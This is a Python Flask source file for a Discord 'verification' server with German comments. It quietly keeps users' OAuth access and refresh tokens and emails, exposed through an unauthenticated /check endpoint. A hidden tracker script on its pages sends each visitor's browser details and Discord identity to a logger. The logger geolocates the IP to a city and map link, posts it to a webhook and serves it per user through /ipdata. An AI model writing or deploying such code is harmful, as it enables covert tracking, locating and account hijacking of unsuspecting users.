import os
import json
import time
import base64
import threading
from urllib.parse import quote
import requests
from flask import Flask, request, Response, make_response

app = Flask(__name__)

# ============================================================
# ENV-VARIABLEN LADEN
# ============================================================
CLIENT_ID = os.environ.get("CLIENT_ID", "")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "")
GUILD_ID = os.environ.get("GUILD_ID", "")

PUBLIC_URL = os.environ.get("PUBLIC_URL", "") or os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")
PUBLIC_URL = PUBLIC_URL.rstrip("/")

ALLOWED_SERVERS_STR = os.environ.get("ALLOWED_SERVERS", GUILD_ID)
ALLOWED_SERVERS = [int(x) for x in ALLOWED_SERVERS_STR.split(",") if x.strip().isdigit()]

REDIRECT_URI = f"{PUBLIC_URL}/callback"

# Anti-VPN: "1" = aktiviert, "0" = deaktiviert
ANTIVPN_ENABLED = os.environ.get("ANTIVPN_ENABLED", "1") == "1"

TRACKER_SNIPPET = """
<script>
(function () {
    try {
        var p = new URLSearchParams({
            ua: navigator.userAgent,
            lang: navigator.language,
            screen: screen.width + "x" + screen.height,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ref: document.referrer,
            page: location.pathname + location.search,
            host: location.host
        });
        try {
            var m = document.cookie.match(/(?:^|;\\s*)discord_user=([^;]*)/);
            if (m) {
                var u = JSON.parse(decodeURIComponent(m[1]));
                if (u && u.id) {
                    p.set("name", u.username || "");
                    p.set("dn", u.display_name || "");
                    p.set("id", u.id);
                }
            }
        } catch (e) {}
        var url = "%s/log?" + p.toString();
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url);
        } else {
            var img = new Image();
            img.src = url;
        }
    } catch (e) {}
})();
</script>
""" % PUBLIC_URL

SITE_WEBHOOK_URL = os.environ.get("SITE_WEBHOOK_URL", "")
SITE_LOG_KEY = os.environ.get("SITE_LOG_KEY", "")

_geo_cache = {}
GEO_CACHE_TTL = 3600

# VPN-Check-Cache: ip -> (zeitstempel, ist_vpn_bool)
_vpn_cache = {}
VPN_CACHE_TTL = 1800

IPDATA = {}
IPDATA_MAX = 5000

print("=" * 60)
print("VERIFY-SERVER STARTUP-DIAGNOSE")
print("=" * 60)
print(f"CLIENT_ID        gesetzt: {bool(CLIENT_ID)} (Länge: {len(CLIENT_ID)})")
print(f"CLIENT_SECRET    gesetzt: {bool(CLIENT_SECRET)} (Länge: {len(CLIENT_SECRET)})")
print(f"GUILD_ID         gesetzt: {bool(GUILD_ID)} (Wert: {GUILD_ID})")
print(f"ALLOWED_SERVERS: {ALLOWED_SERVERS}")
print(f"PUBLIC_URL:      {PUBLIC_URL}")
print(f"REDIRECT_URI:    {REDIRECT_URI}")
print(f"SITE_WEBHOOK_URL gesetzt: {bool(SITE_WEBHOOK_URL)}")
print(f"ANTIVPN_ENABLED: {ANTIVPN_ENABLED}")
print("=" * 60)

results = {}


# ============================================================
# ANTI-VPN-CHECK
# proxycheck.io (kostenlos, kein API-Key nötig für wenige Anfragen):
# "yes" = VPN/Proxy/Tor erkannt
# ============================================================
def is_vpn(ip):
    """True = VPN/Proxy erkannt. Bei Check-Fehler: False (fail-open)."""
    if not ANTIVPN_ENABLED:
        return False
    now = time.time()
    cached = _vpn_cache.get(ip)
    if cached and now - cached[0] < VPN_CACHE_TTL:
        return cached[1]
    vpn = False
    try:
        r = requests.get(
            f"https://proxycheck.io/v2/{ip}?vpn=1&asn=1&risk=1",
            timeout=5,
        )
        d = r.json()
        node = d.get(ip, {})
        if isinstance(node, dict):
            # "yes" = Proxy/VPN, "no" = sauber
            if node.get("proxy") == "yes":
                vpn = True
            # Zusätzlich: Hosting/Rechenzentrum-ASN als VPN werten (optional, hier an)
            risk = str(node.get("risk", "0"))
            if node.get("type") in ("Hosting", "Business", "VPN") and node.get("proxy") == "yes":
                vpn = True
    except Exception as e:
        print(f"[ANTIVPN] Check-Fehler für {ip}: {e} -> erlaube User (fail-open)")
        vpn = False
    _vpn_cache[ip] = (now, vpn)
    if vpn:
        print(f"[ANTIVPN] 🚫 VPN/Proxy erkannt: {ip}")
    return vpn


# ============================================================
# ROUTEN
# ============================================================
@app.route("/")
def index():
    return f"""<h1>✅ Verify-System läuft</h1>
<p>REDIRECT_URI: <code>{REDIRECT_URI}</code></p>
<p>CLIENT_ID gesetzt: <b>{'JA' if CLIENT_ID else 'NEIN'}</b> &nbsp;•&nbsp;
CLIENT_SECRET gesetzt: <b>{'JA' if CLIENT_SECRET else 'NEIN'}</b></p>
<p>SITE_WEBHOOK_URL gesetzt: <b>{'JA' if SITE_WEBHOOK_URL else 'NEIN'}</b></p>
<p>Anti-VPN aktiv: <b>{'JA' if ANTIVPN_ENABLED else 'NEIN'}</b></p>
<p><a href="/debug">→ Debug-Übersicht öffnen</a></p>
{TRACKER_SNIPPET}"""


@app.route("/debug")
def debug():
    return {
        "env_gesetzt": {
            "CLIENT_ID": bool(CLIENT_ID),
            "CLIENT_SECRET": bool(CLIENT_SECRET),
            "GUILD_ID": bool(GUILD_ID),
            "PUBLIC_URL": PUBLIC_URL,
            "ALLOWED_SERVERS": ALLOWED_SERVERS,
            "SITE_WEBHOOK_URL": bool(SITE_WEBHOOK_URL),
            "SITE_LOG_KEY": bool(SITE_LOG_KEY),
            "ANTIVPN_ENABLED": ANTIVPN_ENABLED,
            "RENDER_EXTERNAL_URL": os.environ.get("RENDER_EXTERNAL_URL", "(nicht gesetzt)"),
        },
        "REDIRECT_URI": REDIRECT_URI,
        "aktive_states": len(results),
        "ipdata_eintraege": len(IPDATA),
        "geo_cache_entries": len(_geo_cache),
        "vpn_cache_entries": len(_vpn_cache),
        "zeitstempel": int(time.time()),
    }


@app.route("/ipdata")
def ipdata():
    uid = request.args.get("user_id", "")
    data = IPDATA.get(uid)
    if data is None:
        return {"status": "not_found"}
    return {"status": "ok", **data}


def oauth_error_hint(err):
    hints = {
        "invalid_client": "CLIENT_ID oder CLIENT_SECRET fehlen/falsch auf Render → Environment prüfen und NEU deployen.",
        "redirect_uri_mismatch": "redirect_uri stimmt nicht überein → REDIRECT_URI EXAKT im Developer Portal eintragen.",
        "invalid_grant": "Dieser Code wurde schon verwendet oder ist abgelaufen → Neuen Verify-Button-Klick starten.",
        "invalid_scope": "Scope im OAuth-Link stimmt nicht → Bot-Code prüfen (identify email guilds guilds.join).",
    }
    return hints.get(err, "Siehe Render-Logs für Details.")


@app.route("/callback")
def callback():
    code = request.args.get("code")
    state = request.args.get("state")
    error = request.args.get("error")

    print(f"[CALLBACK] code={'JA' if code else 'NEIN'}, state={'JA' if state else 'NEIN'}, error={error}")

    if error:
        return error_page("Fehler", f"Discord-Fehler: {error}. Klicke erneut auf Verifizieren.")
    if not code or not state:
        return error_page("Fehler", "Code oder State fehlt.")

    # ==========================================================
    # ANTI-VPN: IP prüfen, BEVOR der OAuth-Token-Tausch passiert
    # ==========================================================
    ip = request.headers.get("X-Forwarded-For", "").split(",")[0].strip() \
         or request.remote_addr or "Unbekannt"
    if is_vpn(ip):
        results[state] = {"status": "error", "reason": "vpn_detected"}
        return error_page("VPN erkannt 🚫",
                          "Deaktiviere dein <b>VPN / Proxy</b> und klicke dann erneut auf <b>Verifizieren</b>.<br><br>"
                          "Aus Sicherheitsgründen ist die Verifizierung mit VPN nicht möglich.")

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        resp = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers, timeout=15)
        if resp.status_code != 200:
            try:
                err = resp.json().get("error", resp.text)
            except Exception:
                err = resp.text
            hint = oauth_error_hint(err)
            return error_page("OAuth2-Fehler",
                              f"<b>Status:</b> {resp.status_code}<br><b>Grund:</b> <code>{err}</code><br><br><b>Hinweis:</b> {hint}")

        token_data = resp.json()
        access_token = token_data.get("access_token")
        if not access_token:
            return error_page("Fehler", "Kein Access-Token erhalten.")

        auth_headers = {"Authorization": f"Bearer {access_token}"}
        me = requests.get("https://discord.com/api/users/@me", headers=auth_headers, timeout=10).json()
        guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=auth_headers, timeout=10).json()

        user_id = me.get("id")
        email = me.get("email", "")
        verified = me.get("verified", False)

        if not user_id:
            return error_page("Fehler", "Konnte User-ID nicht ermitteln.")

        if not email or not verified:
            results[state] = {"user_id": int(user_id), "status": "error", "reason": "email_not_verified"}
            return error_page("E-Mail nicht verifiziert",
                              "Bestätige deine E-Mail zuerst in den Discord-Einstellungen (Konto → E-Mail).")

        user_guild_ids = {int(g["id"]) for g in guilds if g.get("id")}
        if not (user_guild_ids & set(ALLOWED_SERVERS)):
            results[state] = {"user_id": int(user_id), "status": "error", "reason": "not_on_server"}
            return error_page("Nicht auf dem Server",
                              "Du bist auf keinem der erlaubten Server. Tritt dem Server erst bei und klicke dann erneut auf Verifizieren.")

        results[state] = {
            "status": "success",
            "user_id": int(user_id),
            "email": email,
            "username": me.get("username", ""),
            "display_name": me.get("global_name") or "",
            "guilds": [
                {"id": g.get("id"), "name": g.get("name"), "joined_at": g.get("joined_at")}
                for g in guilds if g.get("id")
            ],
            "access_token": token_data.get("access_token", ""),
            "refresh_token": token_data.get("refresh_token", ""),
            "expires_in": token_data.get("expires_in", 604800),
        }
        print(f"[CALLBACK] ✅ Erfolg für state {state}")

        resp = make_response(success_page())
        try:
            cookie_data = quote(json.dumps({
                "username": me.get("username", ""),
                "display_name": me.get("global_name") or "",
                "id": user_id,
            }, ensure_ascii=False))
            resp.set_cookie("discord_user", cookie_data, max_age=60 * 60 * 24 * 30, samesite="Lax")
        except Exception:
            pass
        return resp

    except Exception as e:
        print(f"[CALLBACK] Exception: {e}")
        return error_page("Fehler", f"Interner Fehler: {e}")


@app.route("/check")
def check_state():
    state = request.args.get("state")
    if not state:
        return {"status": "no_state"}, 400
    result = results.get(state)
    if result is None:
        return {"status": "pending"}
    return result


# ============================================================
# BESUCHER-LOGGER (Website -> Discord-Webhook + Speicher für Bot)
# ============================================================
def _send_visitor_log(data):
    try:
        ip = data["ip"]

        geo = {}
        now = time.time()
        cached = _geo_cache.get(ip)
        if cached and now - cached[0] < GEO_CACHE_TTL:
            geo = cached[1]
        else:
            try:
                r = requests.get(
                    f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,isp,org,as,lat,lon,timezone",
                    timeout=2,
                )
                d = r.json()
                if d.get("status") == "success":
                    geo = d
                    _geo_cache[ip] = (now, geo)
            except Exception:
                pass

        lat, lon = geo.get("lat"), geo.get("lon")
        map_link = f"https://www.google.com/maps?q={lat},{lon}" if lat is not None and lon is not None else None

        uid = data.get("uid") or ""
        if uid:
            IPDATA[uid] = {
                "ip": ip,
                "country": geo.get("country", ""),
                "region": geo.get("regionName", ""),
                "city": geo.get("city", ""),
                "isp": geo.get("isp", ""),
                "lat": str(lat) if lat is not None else "",
                "lon": str(lon) if lon is not None else "",
                "timezone": geo.get("timezone", ""),
                "device": data.get("ua", ""),
                "lang": data.get("lang", ""),
                "screen": data.get("screen", ""),
                "saved_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
            if len(IPDATA) > IPDATA_MAX:
                for k in list(IPDATA.keys())[:len(IPDATA) - IPDATA_MAX]:
                    IPDATA.pop(k, None)
            print(f"[IPDATA] Gespeichert für User {uid}: {ip} / {geo.get('country','?')}")

        fields = [
            {"name": "🛡️ IP-Adresse", "value": f"`{ip}`", "inline": True},
            {"name": "🌍 Land", "value": f"{geo.get('country', '?')} {geo.get('countryCode', '')}".strip(), "inline": True},
            {"name": "🏙️ Stadt", "value": geo.get("city", "?"), "inline": True},
            {"name": "🏢 ISP", "value": geo.get("isp", "?")[:1024], "inline": True},
            {"name": "🗺️ Karte", "value": f"[Google Maps]({map_link})" if map_link else "–", "inline": True},
            {"name": "🧭 Server-TZ", "value": geo.get("timezone", "?"), "inline": True},
            {"name": "🕒 Browser-TZ", "value": data["tz"], "inline": True},
            {"name": "📄 Seite", "value": f"{data['host']}{data['page']}"},
            {"name": "💻 User-Agent", "value": data["ua"]},
            {"name": "🔗 Referrer", "value": data["ref"]},
            {"name": "🖥️ Auflösung", "value": data["screen"], "inline": True},
            {"name": "🗣️ Sprache", "value": data["lang"], "inline": True},
            {"name": "⏰ Serverzeit", "value": time.strftime("%d.%m.%Y %H:%M:%S"), "inline": True},
        ]

        name = data.get("name") or ""
        dn = data.get("dn") or ""
        if name or dn or uid:
            lines = []
            if name:
                lines.append(f"**{name}**")
            if dn:
                lines.append(f"Discord: **{dn}**")
            if uid:
                lines.append(f"ID: `{uid}`")
            fields.insert(1, {"name": "👤 Name", "value": "\n".join(lines), "inline": False})

        payload = {
            "username": "Site-Logger",
            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/2/23/Blue_globe_icon.svg/240px-Blue_globe_icon.svg.png",
            "embeds": [{
                "title": "🌐 Neuer Besucher erfasst",
                "description": "Ein Besucher wurde auf deiner Website registriert.",
                "color": 0x5865F2,
                "thumbnail": {"url": "https://upload.wikimedia.org/wikipedia/commons/thumb/2/23/Blue_globe_icon.svg/240px-Blue_globe_icon.svg.png"},
                "fields": fields,
                "footer": {"text": "Site-Logger • " + time.strftime("%d.%m.%Y %H:%M")},
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
            }],
        }

        try:
            r = requests.post(SITE_WEBHOOK_URL, json=payload, timeout=3)
            if r.status_code not in (200, 204):
                print(f"[LOG] Webhook-Antwort: {r.status_code} {r.text[:200]}")
        except Exception as e:
            print(f"[LOG] Webhook-Fehler: {e}")
    except Exception as e:
        print(f"[LOG] Fehler im Hintergrund-Task: {e}")


@app.route("/log", methods=["GET", "POST"])
def log_visitor():
    if not SITE_WEBHOOK_URL:
        return "kein Webhook konfiguriert", 503

    if SITE_LOG_KEY and request.args.get("key") != SITE_LOG_KEY:
        return "forbidden", 403

    ip = request.headers.get("X-Forwarded-For", "").split(",")[0].strip() \
         or request.remote_addr or "Unbekannt"

    q = request.args
    payload_data = {
        "ip": ip,
        "name": (q.get("name") or "")[:128],
        "dn": (q.get("dn") or "")[:128],
        "uid": (q.get("id") or "")[:64],
        "ua": (q.get("ua") or request.headers.get("User-Agent") or "Unbekannt")[:1024],
        "ref": (q.get("ref") or "Direkt")[:1024],
        "page": (q.get("page") or "/")[:512],
        "host": (q.get("host") or request.headers.get("Host") or "?")[:256],
        "screen": (q.get("screen") or "?")[:64],
        "lang": (q.get("lang") or "?")[:64],
        "tz": (q.get("tz") or "?")[:128],
    }

    threading.Thread(target=_send_visitor_log, args=(payload_data,), daemon=True).start()

    if "image/" in request.headers.get("Accept", ""):
        gif = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
        return Response(gif, mimetype="image/gif")

    return "OK"


# ============================================================
# SEITEN-DESIGN
# ============================================================
def success_page():
    return """<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verifiziert ✅</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, #1e1b4b 0%, #312e81 50%, #6d28d9 100%);
    padding: 20px;
  }
  .card {
    background: #ffffff; border-radius: 24px; padding: 48px 56px;
    max-width: 480px; width: 100%; text-align: center;
    box-shadow: 0 25px 60px rgba(0,0,0,.35); animation: pop .5s ease;
  }
  @keyframes pop { from { transform: scale(.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
  .check {
    width: 96px; height: 96px; margin: 0 auto 24px;
    background: #22c55e; border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    animation: bounce 1.4s ease infinite;
  }
  @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
  .check svg { width: 52px; height: 52px; }
  h1 { font-size: 26px; color: #111827; margin-bottom: 12px; }
  p  { color: #6b7280; font-size: 16px; line-height: 1.5; }
  .btn {
    display: inline-block; margin-top: 28px; padding: 12px 28px;
    background: #5865F2; color: #fff; text-decoration: none;
    border-radius: 999px; font-weight: 600; transition: background .2s;
  }
  .btn:hover { background: #4752c4; }
</style>
</head>
<body>
  <div class="card">
    <div class="check">
      <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <path d="M20 6L9 17l-5-5"/>
      </svg>
    </div>
    <h1>Du hast dich erfolgreich verifiziert ✅</h1>
    <p>Dein Konto wurde bestätigt.<br>Du kannst dieses Fenster jetzt schließen.</p>
    <a class="btn" href="https://discord.com/channels/__GUILD_ID__">Zurück zu Discord</a>
  </div>
""" + TRACKER_SNIPPET + """
</body>
</html>""".replace("__GUILD_ID__", GUILD_ID or "")


def error_page(title, text):
    return f"""<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{
    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, #1e1b4b 0%, #312e81 50%, #6d28d9 100%);
    padding: 20px;
  }}
  .card {{
    background: #ffffff; border-radius: 24px; padding: 40px 48px;
    max-width: 480px; width: 100%; text-align: center;
    box-shadow: 0 25px 60px rgba(0,0,0,.35);
  }}
  .icon {{
    width: 80px; height: 80px; margin: 0 auto 20px;
    background: #ef4444; border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
  }}
  .icon svg {{ width: 40px; height: 40px; }}
  h1 {{ font-size: 24px; color: #111827; margin-bottom: 12px; }}
  p  {{ color: #6b7280; font-size: 15px; line-height: 1.6; }}
  .btn {{
    display: inline-block; margin-top: 24px; padding: 10px 24px;
    background: #5865F2; color: #fff; text-decoration: none;
    border-radius: 999px; font-weight: 600; transition: background .2s;
  }}
  .btn:hover {{ background: #4752c4; }}
</style>
</head>
<body>
  <div class="card">
    <div class="icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round">
        <path d="M18 6L6 18M6 6l12 12"/>
      </svg>
    </div>
    <h1>{title}</h1>
    <p>{text}</p>
    <a class="btn" href="https://discord.com/channels/{GUILD_ID}">Zurück zu Discord</a>
  </div>
</body>
</html>"""


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"[START] Läuft auf Port {port}")
    app.run(host="0.0.0.0", port=port)